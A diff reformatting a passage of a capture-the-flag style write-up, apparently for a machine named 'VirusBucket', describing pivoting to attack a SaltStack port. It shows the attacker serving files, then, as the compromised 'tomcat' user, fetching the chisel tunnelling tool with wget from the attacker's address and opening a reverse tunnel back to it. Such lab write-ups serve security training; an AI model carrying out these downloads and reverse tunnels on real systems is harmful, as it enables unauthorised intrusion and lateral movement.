@@ -134,20 +134,16 @@ what these port used for by default.[**Here**](https://docs.saltstack.com/en/lat
 
   we need to fordward port 4506 and exploit it on our machine as we need `salt` python module which is not installed on target machine.let transfer [**Chisel**](https://github.com/jpillora/chisel/releases) to target machine.
 
-  `start the server from chisel directory`
+  start the server from chisel directory
 
 ```shell
   ┌─[oxy@oxy]─[~/tools]
   └──╼ $python3 -m http.server 4321
         Serving HTTP on 0.0.0.0 port 4321 (http://0.0.0.0:4321/)
 ```
-  ```shell
-  ┌─[oxy@oxy]─[~/tools]
-  └──╼ $python3 -m http.server 4321
-        Serving HTTP on 0.0.0.0 port 4321 (http://0.0.0.0:4321/)
-        ```
+  
+ download chisel on target box and forward port 4506
 
-   `download chisel on target box and forward port 4506`
 ```shell
   tomcat@VirusBucket$ cd /dev/shm
  tomcat@VirusBucket:/dev/shm$ wget http://10.10.14.68:4321/chisel                   
@@ -156,9 +152,9 @@ what these port used for by default.[**Here**](https://docs.saltstack.com/en/lat
  2020/10/05 10:42:15 client: Connecting to ws://10.10.14.68:1234
  2020/10/05 10:42:17 client: Fingerprint f4:f2:94:8a:42:4c:14:41:93:e7:3a:30:96:52:74:99
  2020/10/05 10:42:18 client: Connected (Latency 309.19257ms)
- ```
+```
   
-     `make sure to start chisel on your machine`
+  make sure to start chisel on your machine
 
 ```shell
 ┌─[oxy@oxy]─[~/tools]
